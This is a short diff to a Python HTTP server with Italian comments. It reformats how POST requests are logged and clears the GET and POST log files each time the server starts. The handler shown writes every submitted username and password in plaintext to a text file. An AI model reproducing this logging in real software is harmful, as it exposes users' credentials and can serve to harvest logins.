@@ -59,7 +59,7 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
         
         # Scrivo su file le richieste POST
         with open("POST_requests.txt", "a") as out:
-          info = "\n\nPOST request,\n username inserito: " + username + "  password inserita: " + password 
+          info = "\n\n\n\nPOST request,\n username inserito: " + username + "  password inserita: " + password 
           out.write(info)
         
 # ThreadingTCPServer per gestione multirichiesta
@@ -89,8 +89,10 @@ def main():
     # Interrompe l'esecuzione se da tastiera arriva la sequenza (CTRL + C) 
     signal.signal(signal.SIGINT, signal_handler)
     
-    # Cancella i dati get ogni volta che il server viene attivato
+    # Cancella i dati GET e POST memorizzati nei file ogni volta che il server viene attivato
     f = open('GET_requests.txt','w', encoding="utf-8")
+    f.close()
+    f = open('POST_requests.txt','w', encoding="utf-8")
     f.close()
     
     try:
